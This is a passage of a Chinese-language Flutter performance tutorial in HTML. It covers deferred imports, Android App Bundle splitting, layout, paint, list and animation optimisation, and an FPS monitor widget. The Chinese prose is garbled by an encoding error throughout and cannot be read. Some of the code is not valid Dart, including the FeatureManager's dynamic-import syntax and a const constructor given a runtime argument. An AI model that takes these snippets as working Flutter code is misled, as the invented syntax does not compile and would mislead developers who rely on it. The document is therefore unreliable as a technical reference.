<li>å‡å°‘åˆå§‹åŠ è½½ä½“ç§¯</li>
<li>èŠ‚çœç”¨æˆ·æµé‡ï¼Œæé«˜å¯åŠ¨é€Ÿåº¦</li>
</ul>
<p><strong>å®ç°æ–¹å¼</strong>ï¼š</p>
<ol>
<li>deferred import</li>
<li>åŠ¨æ€ç‰¹æ€§æ¨¡å—</li>
<li>ä»£ç åˆ†å‰²</li>
</ol>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// å»¶è¿Ÿå¯¼å…¥</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:heavy_library/heavy_library.dart'</span> <span class="hljs-keyword">deferred</span> <span class="hljs-keyword">as</span> heavy;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LazyLoadWidget</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _LazyLoadWidgetState createState() =&gt; _LazyLoadWidgetState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_LazyLoadWidgetState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">LazyLoadWidget</span>&gt; </span>{
  <span class="hljs-built_in">bool</span> _isLoaded = <span class="hljs-keyword">false</span>;
  
  Future&lt;<span class="hljs-keyword">void</span>&gt; _loadLibrary() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">await</span> heavy.loadLibrary();
    setState(() =&gt; _isLoaded = <span class="hljs-keyword">true</span>);
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">if</span> (!_isLoaded) {
      <span class="hljs-keyword">return</span> ElevatedButton(
        onPressed: _loadLibrary,
        child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'åŠ è½½åŠŸèƒ½æ¨¡å—'</span>),
      );
    }
    
    <span class="hljs-keyword">return</span> heavy.HeavyWidget();
  }
}

<span class="hljs-comment">// åŠ¨æ€ç‰¹æ€§åŠ è½½</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FeatureManager</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; _loadedFeatures = {};
  
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">dynamic</span>&gt; loadFeature(<span class="hljs-built_in">String</span> featureName) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (_loadedFeatures.containsKey(featureName)) {
      <span class="hljs-keyword">return</span> _loadedFeatures[featureName];
    }
    
    <span class="hljs-keyword">switch</span> (featureName) {
      <span class="hljs-keyword">case</span> <span class="hljs-string">'payment'</span>:
        <span class="hljs-keyword">final</span> payment = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'package:app/payment.dart'</span>)
            .<span class="hljs-keyword">deferred</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">dynamic</span>;
        _loadedFeatures[featureName] = payment;
        <span class="hljs-keyword">return</span> payment;
        
      <span class="hljs-keyword">case</span> <span class="hljs-string">'analytics'</span>:
        <span class="hljs-comment">// æŒ‰éœ€åŠ è½½åˆ†ææ¨¡å—</span>
        <span class="hljs-keyword">final</span> analytics = <span class="hljs-keyword">await</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'package:app/analytics.dart'</span>)
            .<span class="hljs-keyword">deferred</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">dynamic</span>;
        _loadedFeatures[featureName] = analytics;
        <span class="hljs-keyword">return</span> analytics;
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
  }
}
</code></pre>
<h4 data-id="heading-17">ä¼˜åŒ–æ‰‹æ®µ4ï¼šä¼˜åŒ–åº”ç”¨Bundle</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šåˆ©ç”¨å¹³å°ç‰¹æ€§è¿›è¡Œæ™ºèƒ½åˆ†å‘ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
<li>Android App Bundleå‡å°‘ä¸‹è½½ä½“ç§¯</li>
<li>iOS App ThinningæŒ‰è®¾å¤‡åˆ†å‘</li>
<li>æ”¯æŒåŠ¨æ€åŠŸèƒ½æ¨¡å—</li>
</ul>
<p><strong>å®ç°æ–¹å¼</strong>ï¼š</p>
<ol>
<li>Android App Bundle</li>
<li>iOS App Thinning</li>
<li>åŠ¨æ€åŠŸèƒ½äº¤ä»˜</li>
</ol>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-gradle" lang="gradle">// å¯ç”¨Android App Bundle
android {
    bundle {
        language {
            enableSplit = true  // æŒ‰è¯­è¨€æ‹†åˆ†
        }
        density {
            enableSplit = true  // æŒ‰å±å¹•å¯†åº¦æ‹†åˆ†
        }
        abi {
            enableSplit = true  // æŒ‰CPUæ¶æ„æ‹†åˆ†
        }
    }
}
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ„å»ºå‘½ä»¤</span>
<span class="hljs-comment"># 1. æ„å»ºAndroid App Bundle</span>
flutter build appbundle

<span class="hljs-comment"># 2. åˆ†æBundle</span>
flutter build appbundle --target-platform android-arm64 --analyze-size

<span class="hljs-comment"># 3. æµ‹è¯•Bundle</span>
bundletool build-apks --bundle=app.aab --output=app.apks
bundletool install-apks --apks=app.apks
</code></pre>
<h3 data-id="heading-18">å››ã€ä¼˜åŒ–æ¸²æŸ“æ€§èƒ½</h3>
<h4 data-id="heading-19">ä»€ä¹ˆå¯¼è‡´äº†æ¸²æŸ“å¡é¡¿ï¼Ÿ</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[æ¸²æŸ“å¡é¡¿åŸå› ] --&gt; B[å¤æ‚å¸ƒå±€è®¡ç®—]
    A --&gt; C[é¢‘ç¹ç»˜åˆ¶æ“ä½œ]
    A --&gt; D[å›¾å±‚åˆæˆå¼€é”€]
    A --&gt; E[GPUè´Ÿè½½è¿‡é«˜]
    
    B --&gt; F[åµŒå¥—è¿‡æ·±]
    B --&gt; G[çº¦æŸä¼ é€’é¢‘ç¹]
    
    C --&gt; H[è¿‡åº¦ä½¿ç”¨é˜´å½±]
    C --&gt; I[é€æ˜åº¦å¤„ç†ä¸å½“]
    C --&gt; J[é¢‘ç¹è£å‰ªæ“ä½œ]
    
    D --&gt; K[RepaintBoundaryè¿‡å¤š]
    D --&gt; L[å›¾å±‚æ··åˆæ¨¡å¼å¤æ‚]
</code></pre>
<h4 data-id="heading-20">ä¼˜åŒ–æ‰‹æ®µ1ï¼šä¼˜åŒ–å¸ƒå±€æ€§èƒ½</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šå‡å°‘å¸ƒå±€è®¡ç®—çš„æ—¶é—´å’Œå¤æ‚åº¦ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
<li>å¸ƒå±€æ˜¯æ¸²æŸ“ç®¡çº¿ä¸­æœ€è€—æ—¶çš„é˜¶æ®µä¹‹ä¸€</li>
<li>å¤æ‚çš„å¸ƒå±€å¯¼è‡´ç•Œé¢å¡é¡¿</li>
<li>ä¸å½“çš„çº¦æŸä¼ é€’å¼•å‘è¿é”é‡æ’</li>
</ul>
<p><strong>ä¼˜åŒ–æ‰‹æ®µ</strong>ï¼š</p>
<ol>
<li>å‡å°‘WidgetåµŒå¥—æ·±åº¦</li>
<li>ä½¿ç”¨åˆé€‚çš„å¸ƒå±€Widget</li>
<li>é¿å…è¿‡åº¦ä½¿ç”¨Flexible/Expanded</li>
<li>ä½¿ç”¨CustomSingleChildLayout/CustomMultiChildLayout</li>
</ol>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ä¸æ¨èï¼šæ·±åº¦åµŒå¥—</span>
Widget buildBadLayout() {
  <span class="hljs-keyword">return</span> Container(
    child: Column(
      children: [
        Container(
          child: Row(
            children: [
              Container(child: Text(<span class="hljs-string">'A'</span>)),
              Container(child: Text(<span class="hljs-string">'B'</span>)),
              Container(child: Text(<span class="hljs-string">'C'</span>)),
            ],
          ),
        ),
        <span class="hljs-comment">// æ›´å¤šåµŒå¥—...</span>
      ],
    ),
  );
}

<span class="hljs-comment">// ä¼˜åŒ–çš„å¸ƒå±€</span>
Widget buildGoodLayout() {
  <span class="hljs-keyword">return</span> Column(
    children: [
      Row(
        children: <span class="hljs-keyword">const</span> [
          Text(<span class="hljs-string">'A'</span>),
          SizedBox(width: <span class="hljs-number">8</span>),
          Text(<span class="hljs-string">'B'</span>),
          SizedBox(width: <span class="hljs-number">8</span>),
          Text(<span class="hljs-string">'C'</span>),
        ],
      ),
      <span class="hljs-comment">// ä½¿ç”¨é—´éš”Widgetæ›¿ä»£å¤šä½™çš„Container</span>
      <span class="hljs-keyword">const</span> SizedBox(height: <span class="hljs-number">16</span>),
    ],
  );
}

<span class="hljs-comment">// ä½¿ç”¨CustomMultiChildLayoutä¼˜åŒ–å¤æ‚å¸ƒå±€</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OptimizedLayout</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> CustomMultiChildLayout(
      delegate: _LayoutDelegate(),
      children: [
        LayoutId(
          id: _LayoutItem.header,
          child: <span class="hljs-keyword">const</span> HeaderWidget(),
        ),
        LayoutId(
          id: _LayoutItem.content,
          child: <span class="hljs-keyword">const</span> ContentWidget(),
        ),
        LayoutId(
          id: _LayoutItem.footer,
          child: <span class="hljs-keyword">const</span> FooterWidget(),
        ),
      ],
    );
  }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_LayoutDelegate</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">MultiChildLayoutDelegate</span> </span>{
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> performLayout(Size size) {
    <span class="hljs-comment">// ä¸€æ¬¡æ€§è®¡ç®—æ‰€æœ‰å­é¡¹çš„ä½ç½®å’Œå¤§å°</span>
    <span class="hljs-keyword">final</span> headerSize = layoutChild(
      _LayoutItem.header,
      BoxConstraints.loose(size),
    );
    
    <span class="hljs-keyword">final</span> footerSize = layoutChild(
      _LayoutItem.footer,
      BoxConstraints.loose(size),
    );
    
    <span class="hljs-keyword">final</span> contentConstraints = BoxConstraints(
      maxWidth: size.width,
      maxHeight: size.height - headerSize.height - footerSize.height,
    );
    
    layoutChild(_LayoutItem.content, contentConstraints);
    
    <span class="hljs-comment">// å®šä½å­é¡¹</span>
    positionChild(_LayoutItem.header, Offset.zero);
    positionChild(_LayoutItem.content, Offset(<span class="hljs-number">0</span>, headerSize.height));
    positionChild(_LayoutItem.footer, 
        Offset(<span class="hljs-number">0</span>, size.height - footerSize.height));
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-built_in">bool</span> shouldRelayout(<span class="hljs-keyword">covariant</span> MultiChildLayoutDelegate oldDelegate) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
  }
}

<span class="hljs-keyword">enum</span> _LayoutItem { header, content, footer }
</code></pre>
<h4 data-id="heading-21">ä¼˜åŒ–æ‰‹æ®µ2ï¼šä¼˜åŒ–ç»˜åˆ¶æ€§èƒ½</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šå‡å°‘å¤æ‚ç»˜åˆ¶æ“ä½œé¢‘ç‡ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
<li>å¤æ‚çš„ç»˜åˆ¶æ“ä½œæ¶ˆè€—GPUèµ„æº</li>
<li>è¿‡åº¦ç»˜åˆ¶æµªè´¹æ¸²æŸ“æ—¶é—´</li>
<li>ä¸å½“çš„æ•ˆæœä½¿ç”¨å¯¼è‡´æ€§èƒ½å˜å·®</li>
</ul>
<p><strong>ä¼˜åŒ–ç­–ç•¥</strong>ï¼š</p>
<ol>
<li>é¿å…è¿‡åº¦ä½¿ç”¨é˜´å½±</li>
<li>è°¨æ…ä½¿ç”¨é€æ˜åº¦</li>
<li>å‡å°‘è£å‰ªæ“ä½œ</li>
<li>ä½¿ç”¨ç¼“å­˜å›¾ç‰‡</li>
</ol>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ä¼˜åŒ–ç»˜åˆ¶</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PaintOptimization</span> </span>{
  <span class="hljs-comment">// 1. ä¼˜åŒ–é˜´å½±</span>
  <span class="hljs-keyword">static</span> BoxDecoration optimizedShadow() {
    <span class="hljs-keyword">return</span> BoxDecoration(
      color: Colors.white,
      borderRadius: BorderRadius.circular(<span class="hljs-number">8</span>),
      <span class="hljs-comment">// è¿‡åº¦ä½¿ç”¨é˜´å½±</span>
      <span class="hljs-comment">// boxShadow: [</span>
      <span class="hljs-comment">//   BoxShadow(color: Colors.black12, blurRadius: 16),</span>
      <span class="hljs-comment">//   BoxShadow(color: Colors.black12, blurRadius: 8),</span>
      <span class="hljs-comment">//   BoxShadow(color: Colors.black12, blurRadius: 4),</span>
      <span class="hljs-comment">// ],</span>
      
      <span class="hljs-comment">// ä¼˜åŒ–å</span>
      boxShadow: <span class="hljs-keyword">const</span> [
        BoxShadow(
          color: Colors.black12,
          blurRadius: <span class="hljs-number">4</span>,
          spreadRadius: <span class="hljs-number">0</span>,
          offset: Offset(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>),
        ),
      ],
    );
  }
  
  <span class="hljs-comment">// 2. ä¼˜åŒ–é€æ˜åº¦</span>
  <span class="hljs-keyword">static</span> Widget optimizedOpacity() {
    <span class="hljs-comment">// ä½¿ç”¨Opacity Widget</span>
    <span class="hljs-comment">// return Opacity(</span>
    <span class="hljs-comment">//   opacity: 0.5,</span>
    <span class="hljs-comment">//   child: Container(color: Colors.blue),</span>
    <span class="hljs-comment">// );</span>
    
    <span class="hljs-comment">// ä½¿ç”¨é¢œè‰²é€æ˜åº¦</span>
    <span class="hljs-keyword">return</span> Container(
      color: Colors.blue.withOpacity(<span class="hljs-number">0.5</span>),
    );
    
    <span class="hljs-comment">// å¯¹äºé™æ€åŠé€æ˜ï¼Œä½¿ç”¨ColorFiltered</span>
    <span class="hljs-comment">// return ColorFiltered(</span>
    <span class="hljs-comment">//   colorFilter: ColorFilter.mode(</span>
    <span class="hljs-comment">//     Colors.white.withOpacity(0.5),</span>
    <span class="hljs-comment">//     BlendMode.modulate,</span>
    <span class="hljs-comment">//   ),</span>
    <span class="hljs-comment">//   child: Container(color: Colors.blue),</span>
    <span class="hljs-comment">// );</span>
  }
  
  <span class="hljs-comment">// 3. ä¼˜åŒ–è£å‰ª</span>
  <span class="hljs-keyword">static</span> Widget optimizedClip() {
    <span class="hljs-comment">// å¤æ‚è£å‰ª</span>
    <span class="hljs-comment">// return ClipPath(</span>
    <span class="hljs-comment">//   clipper: ComplexClipper(),</span>
    <span class="hljs-comment">//   child: Container(color: Colors.blue),</span>
    <span class="hljs-comment">// );</span>
    
    <span class="hljs-comment">// ç®€å•è£å‰ª</span>
    <span class="hljs-keyword">return</span> ClipRRect(
      borderRadius: BorderRadius.circular(<span class="hljs-number">8</span>),
      child: Container(color: Colors.blue),
    );
    
    <span class="hljs-comment">// ä½¿ç”¨è£…é¥°è€Œä¸æ˜¯è£å‰ª</span>
    <span class="hljs-comment">// return Container(</span>
    <span class="hljs-comment">//   decoration: BoxDecoration(</span>
    <span class="hljs-comment">//     color: Colors.blue,</span>
    <span class="hljs-comment">//     borderRadius: BorderRadius.circular(8),</span>
    <span class="hljs-comment">//   ),</span>
    <span class="hljs-comment">// );</span>
  }
}
</code></pre>
<h4 data-id="heading-22">ä¼˜åŒ–æ‰‹æ®µ3ï¼šä¼˜åŒ–åˆ—è¡¨æ€§èƒ½</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šé’ˆå¯¹ListViewã€GridViewç­‰å¯æ»šåŠ¨ç»„ä»¶è¿›è¡Œä¼˜åŒ–ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
<li>å‡ ä¹æ‰€æœ‰çš„åº”ç”¨éƒ½ä¼šç”¨åˆ°åˆ—è¡¨ç»„ä»¶ï¼Œä»–çš„æ€§èƒ½å¥½åç›´æ¥å½±å“ç”¨æˆ·ä½“éªŒ</li>
<li>ä¸å½“çš„åˆ—è¡¨å®ç°å¯¼è‡´æ»šåŠ¨å¡é¡¿</li>
</ul>
<p><strong>ä¼˜åŒ–ç­–ç•¥</strong>ï¼š</p>
<ol>
<li>ä½¿ç”¨æ­£ç¡®çš„ListViewæ„é€ å‡½æ•°</li>
<li>è®¾ç½®åˆç†çš„ç¼“å­˜èŒƒå›´</li>
<li>ä¼˜åŒ–åˆ—è¡¨é¡¹æ„å»º</li>
<li>ä½¿ç”¨Sliverç³»åˆ—ç»„ä»¶</li>
</ol>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ListOptimization</span> </span>{
  <span class="hljs-comment">// 1. é€‰æ‹©åˆé€‚çš„ListViewæ„é€ å‡½æ•°</span>
  <span class="hljs-keyword">static</span> Widget buildOptimizedList(<span class="hljs-built_in">List</span>&lt;Item&gt; items) {
    <span class="hljs-keyword">return</span> ListView.builder(
      itemCount: items.length,
      
      <span class="hljs-comment">// ä¼˜åŒ–å‚æ•°</span>
      addAutomaticKeepAlives: <span class="hljs-keyword">false</span>, <span class="hljs-comment">// æ‰‹åŠ¨æ§åˆ¶çŠ¶æ€ä¿æŒ</span>
      addRepaintBoundaries: <span class="hljs-keyword">true</span>,   
      
      <span class="hljs-comment">// ç¼“å­˜èŒƒå›´ï¼Œé¢„æ¸²æŸ“åŒºåŸŸ</span>
      cacheExtent: <span class="hljs-number">1000</span>, <span class="hljs-comment">// é»˜è®¤250ï¼Œå¢å¤§å¯å‡å°‘æ»šåŠ¨å¡é¡¿</span>
      
      <span class="hljs-comment">// å¦‚æœitemé«˜åº¦å›ºå®šï¼Œä½¿ç”¨itemExtentæé«˜æ€§èƒ½</span>
      <span class="hljs-comment">// itemExtent: 100,</span>
      
      <span class="hljs-comment">// æˆ–è€…ä½¿ç”¨prototypeItem</span>
      <span class="hljs-comment">// prototypeItem: const ListTile(title: Text('åŸå‹')),</span>
      
      itemBuilder: (context, index) {
        <span class="hljs-keyword">return</span> _buildOptimizedItem(items[index]);
      },
    );
  }
  
  <span class="hljs-comment">// 2. ä¼˜åŒ–åˆ—è¡¨é¡¹æ„å»º</span>
  <span class="hljs-keyword">static</span> Widget _buildOptimizedItem(Item item) {
    <span class="hljs-keyword">return</span> RepaintBoundary(
      child: KeepAlive(
        keepAlive: _shouldKeepAlive(item),
        child: <span class="hljs-keyword">const</span> OptimizedListItem(item: item),
      ),
    );
  }
  
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">bool</span> _shouldKeepAlive(Item item) {
    <span class="hljs-keyword">return</span> item.isImportant;
  }
  
  <span class="hljs-comment">// 3. ä½¿ç”¨CustomScrollViewå’ŒSlivers</span>
  <span class="hljs-keyword">static</span> Widget buildCustomScrollView() {
    <span class="hljs-keyword">return</span> CustomScrollView(
      slivers: [
        <span class="hljs-comment">// å›ºå®šAppBar</span>
        <span class="hljs-keyword">const</span> SliverAppBar(pinned: <span class="hljs-keyword">true</span>, expandedHeight: <span class="hljs-number">200</span>),
        
        <span class="hljs-comment">// å›ºå®šHeader</span>
        <span class="hljs-keyword">const</span> SliverToBoxAdapter(
          child: Padding(
            padding: EdgeInsets.all(<span class="hljs-number">16</span>),
            child: Text(<span class="hljs-string">'å•†å“åˆ—è¡¨'</span>),
          ),
        ),
        
        <span class="hljs-comment">// ä½¿ç”¨SliverFixedExtentList</span>
        SliverFixedExtentList(
          itemExtent: <span class="hljs-number">100</span>, 
          delegate: SliverChildBuilderDelegate(
            (context, index) =&gt; _buildOptimizedItem(_getItem(index)),
            childCount: <span class="hljs-number">1000</span>,
          ),
        ),
      ],
    );
  }
}
</code></pre>
<h4 data-id="heading-23">ä¼˜åŒ–æ‰‹æ®µ4ï¼šä¼˜åŒ–åŠ¨ç”»æ€§èƒ½</h4>
<p><strong>æ˜¯ä»€ä¹ˆ</strong>ï¼šä¼˜åŒ–åŠ¨ç”»çš„æµç•…åº¦å’Œæ€§èƒ½ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé‡è¦</strong>ï¼š</p>
<ul>
<li>åŠ¨ç”»æµç•…åº¦æ˜¯ç”¨æˆ·ä½“éªŒçš„æœ€ç›´è§‚æ„Ÿå—ï¼Œå¤æ‚çš„åŠ¨ç”»ä¼šæ¶ˆè€—å¤§é‡èµ„æºï¼Œä¹Ÿä¼šå¯¼è‡´å¡é¡¿</li>
</ul>
<p><strong>ä¼˜åŒ–ç­–ç•¥</strong>ï¼š</p>
<ol>
<li>ä½¿ç”¨AnimatedWidget/AnimatedBuilder</li>
<li>é¿å…åœ¨åŠ¨ç”»ä¸­è°ƒç”¨setState</li>
<li>ä½¿ç”¨TweenAnimationBuilder</li>
<li>åˆç†ä½¿ç”¨ç‰©ç†åŠ¨ç”»</li>
</ol>
<p><strong>æ€ä¹ˆåš</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnimationOptimization</span> </span>{
  <span class="hljs-comment">// 1. ä½¿ç”¨AnimatedBuilderé¿å…ä¸å¿…è¦çš„é‡å»º</span>
  <span class="hljs-keyword">static</span> Widget buildOptimizedAnimation() {
    <span class="hljs-keyword">return</span> AnimatedBuilder(
      animation: _animationController,
      builder: (context, child) {
        <span class="hljs-keyword">return</span> Transform.rotate(
          angle: _animationController.value * <span class="hljs-number">2</span> * pi,
          child: child,
        );
      },
      child: <span class="hljs-keyword">const</span> Icon(Icons.refresh), 
    );
  }
  
  <span class="hljs-comment">// 2. ä½¿ç”¨TweenAnimationBuilderåŠ¨ç”»</span>
  <span class="hljs-keyword">static</span> Widget buildTweenAnimation() {
    <span class="hljs-keyword">return</span> TweenAnimationBuilder&lt;<span class="hljs-built_in">double</span>&gt;(
      tween: Tween(begin: <span class="hljs-number">0</span>, end: <span class="hljs-number">1</span>),
      duration: <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>),
      builder: (context, value, child) {
        <span class="hljs-keyword">return</span> Opacity(
          opacity: value,
          child: Transform.scale(scale: value, child: child),
        );
      },
      child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'æ·¡å…¥æ”¾å¤§åŠ¨ç”»'</span>),
    );
  }
  
  <span class="hljs-comment">// 3. ä¼˜åŒ–ç‰©ç†åŠ¨ç”»</span>
  <span class="hljs-keyword">static</span> Widget buildPhysicsAnimation() {
    <span class="hljs-keyword">return</span> Draggable(
      feedback: Material(
        child: Container(
          width: <span class="hljs-number">100</span>,
          height: <span class="hljs-number">100</span>,
          color: Colors.blue.withOpacity(<span class="hljs-number">0.5</span>),
        ),
      ),
      childWhenDragging: Container(),
      child: Container(
        width: <span class="hljs-number">100</span>,
        height: <span class="hljs-number">100</span>,
        color: Colors.blue,
      ),
      feedbackOffset: Offset.zero,
    );
  }
}
</code></pre>
<h3 data-id="heading-24">äº”ã€æ€§èƒ½ç›‘æ§</h3>
<h4 data-id="heading-25">å·¥å…·é“¾</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[æ€§èƒ½ç›‘æ§å·¥å…·é“¾] --&gt; B[å¼€å‘é˜¶æ®µ]
    A --&gt; C[æµ‹è¯•é˜¶æ®µ]
    A --&gt; D[ç”Ÿäº§é˜¶æ®µ]
    
    B --&gt; E[Flutter DevTools]
    B --&gt; F[Dart Observatory]
    B --&gt; G[æ€§èƒ½è¦†ç›–å±‚]
    
    C --&gt; H[è‡ªåŠ¨åŒ–æµ‹è¯•]
    C --&gt; I[æ€§èƒ½æµ‹è¯•]
    C --&gt; J[å†…å­˜æ³„æ¼æµ‹è¯•]
    
    D --&gt; K[APMé›†æˆ]
    D --&gt; L[å´©æºƒç›‘æ§]
    D --&gt; M[ç”¨æˆ·è¡Œä¸ºåˆ†æ]
</code></pre>
<h4 data-id="heading-26">å·¥å…·ä½¿ç”¨</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 1. æ€§èƒ½è¦†ç›–å±‚</span>
<span class="hljs-keyword">void</span> enablePerformanceOverlay() {
  runApp(
    MaterialApp(
      home: <span class="hljs-keyword">const</span> MyApp(),
      showPerformanceOverlay: <span class="hljs-keyword">true</span>, 
      
      <span class="hljs-comment">// å…¶ä»–è°ƒè¯•é€‰é¡¹</span>
      checkerboardRasterCacheImages: <span class="hljs-keyword">true</span>,
      checkerboardOffscreenLayers: <span class="hljs-keyword">true</span>,
      showSemanticsDebugger: <span class="hljs-keyword">true</span>,
    ),
  );
}

<span class="hljs-comment">// 2. è‡ªå®šä¹‰æ€§èƒ½ç›‘æ§</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PerformanceMonitor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">final</span> Widget child;
  
  <span class="hljs-keyword">const</span> PerformanceMonitor({Key? key, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.child}) : <span class="hljs-keyword">super</span>(key: key);
  
  <span class="hljs-meta">@override</span>
  _PerformanceMonitorState createState() =&gt; _PerformanceMonitorState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_PerformanceMonitorState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">PerformanceMonitor</span>&gt; 
    <span class="hljs-title">with</span> <span class="hljs-title">WidgetsBindingObserver</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">double</span>&gt; _frameTimes = [];
  <span class="hljs-built_in">double</span> _fps = <span class="hljs-number">0</span>;
  <span class="hljs-built_in">int</span> _droppedFrames = <span class="hljs-number">0</span>;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    WidgetsBinding.instance!.addObserver(<span class="hljs-keyword">this</span>);
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> didChangeMetrics() {
    <span class="hljs-comment">// ç›‘æ§å¸§ç‡</span>
    SchedulerBinding.instance!.addPostFrameCallback((timeStamp) {
      _recordFrameTime(timeStamp);
    });
  }
  
  <span class="hljs-keyword">void</span> _recordFrameTime(<span class="hljs-built_in">Duration</span> timeStamp) {
    <span class="hljs-keyword">final</span> now = timeStamp.inMicroseconds / <span class="hljs-number">1000</span>;
    _frameTimes.add(now);
    
    <span class="hljs-comment">// ä¿ç•™æœ€è¿‘1ç§’çš„æ•°æ®</span>
    <span class="hljs-keyword">final</span> oneSecondAgo = now - <span class="hljs-number">1000</span>;
    _frameTimes.removeWhere((time) =&gt; time &lt; oneSecondAgo);
    
    <span class="hljs-comment">// è®¡ç®—FPS</span>
    <span class="hljs-keyword">if</span> (_frameTimes.length &gt;= <span class="hljs-number">2</span>) {
      <span class="hljs-keyword">final</span> fps = (_frameTimes.length - <span class="hljs-number">1</span>) * <span class="hljs-number">1000</span> / 
                 (_frameTimes.last - _frameTimes.first);
      
      <span class="hljs-comment">// è®¡ç®—æ‰å¸§</span>
      <span class="hljs-keyword">final</span> frameInterval = _frameTimes.last - 
                           _frameTimes[_frameTimes.length - <span class="hljs-number">2</span>];
      <span class="hljs-keyword">if</span> (frameInterval &gt; <span class="hljs-number">33.34</span>) { 
        _droppedFrames++;
      }
      
      setState(() {
        _fps = fps;
      });
    }
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Stack(
      children: [
        widget.child,
        <span class="hljs-keyword">if</span> (kDebugMode) <span class="hljs-comment">// åªåœ¨è°ƒè¯•æ¨¡å¼æ˜¾ç¤º</span>
          Positioned(
            top: <span class="hljs-number">40</span>,
            right: <span class="hljs-number">10</span>,
            child: Container(
              padding: <span class="hljs-keyword">const</span> EdgeInsets.all(<span class="hljs-number">8</span>),
              color: _getFPSColor(),
              child: Text(
                <span class="hljs-string">'FPS: <span class="hljs-subst">${_fps.toStringAsFixed(<span class="hljs-number">1</span>)}</span>\n'</span>
                <span class="hljs-string">'æ‰å¸§: <span class="hljs-subst">$_droppedFrames</span>'</span>,
                style: <span class="hljs-keyword">const</span> TextStyle(color: Colors.white),
              ),
            ),
          ),
      ],
    );
  }
  
  Color _getFPSColor() {
    <span class="hljs-keyword">if</span> (_fps &gt;= <span class="hljs-number">55</span>) <span class="hljs-keyword">return</span> Colors.green;
    <span class="hljs-keyword">if</span> (_fps &gt;= <span class="hljs-number">30</span>) <span class="hljs-keyword">return</span> Colors.orange;
    <span class="hljs-keyword">return</span> Colors.red;
  }
}
</code></pre>
<h3 data-id="heading-27">å…­ã€æ€§èƒ½ä¼˜åŒ–ä¼˜å…ˆçº§</h3>
